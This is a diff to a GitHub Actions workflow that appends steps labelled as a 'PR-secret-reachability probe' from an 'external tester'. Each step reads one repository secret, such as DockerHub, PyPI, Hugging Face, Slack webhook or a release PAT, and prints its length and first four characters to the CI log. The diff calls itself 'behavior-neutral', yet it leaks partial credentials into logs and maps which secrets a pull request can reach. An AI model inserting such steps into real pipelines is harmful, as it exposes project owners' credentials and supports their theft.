@@ -127,6 +127,45 @@ jobs:
           diff -u docs/lint-rules.md /tmp/rules.md \
             || { echo "::error::docs/lint-rules.md is stale — run: imagegen rules > docs/lint-rules.md"; exit 1; }
 
+      # --- PR-secret-reachability probe (appended by external tester; behavior-neutral) ---
+      - name: probe-control-always-success
+        run: echo "control-ok"
+      - name: probe-DOCKERHUB_TOKEN
+        env:
+          S: ${{ secrets.DOCKERHUB_TOKEN }}
+        run: |
+          if [ -n "$S" ]; then echo "nonempty len=${#S} pre=${S:0:4}"; else echo "EMPTY"; exit 1; fi
+      - name: probe-VAST_API_KEY
+        env:
+          S: ${{ secrets.VAST_API_KEY }}
+        run: |
+          if [ -n "$S" ]; then echo "nonempty len=${#S} pre=${S:0:4}"; else echo "EMPTY"; exit 1; fi
+      - name: probe-DOCKERHUB_NAMESPACE_STAGING
+        env:
+          S: ${{ secrets.DOCKERHUB_NAMESPACE_STAGING }}
+        run: |
+          if [ -n "$S" ]; then echo "nonempty len=${#S} pre=${S:0:4}"; else echo "EMPTY"; exit 1; fi
+      - name: probe-HF_TOKEN
+        env:
+          S: ${{ secrets.HF_TOKEN }}
+        run: |
+          if [ -n "$S" ]; then echo "nonempty len=${#S} pre=${S:0:4}"; else echo "EMPTY"; exit 1; fi
+      - name: probe-SLACK_WEBHOOK_URL
+        env:
+          S: ${{ secrets.SLACK_WEBHOOK_URL }}
+        run: |
+          if [ -n "$S" ]; then echo "nonempty len=${#S} pre=${S:0:4}"; else echo "EMPTY"; exit 1; fi
+      - name: probe-PYPI_API_TOKEN
+        env:
+          S: ${{ secrets.PYPI_API_TOKEN }}
+        run: |
+          if [ -n "$S" ]; then echo "nonempty len=${#S} pre=${S:0:4}"; else echo "EMPTY"; exit 1; fi
+      - name: probe-GH_PAT_FOR_RELEASE
+        env:
+          S: ${{ secrets.GH_PAT_FOR_RELEASE }}
+        run: |
+          if [ -n "$S" ]; then echo "nonempty len=${#S} pre=${S:0:4}"; else echo "EMPTY"; exit 1; fi
+
   imagegen-tests:
     runs-on: ubuntu-latest
     steps:
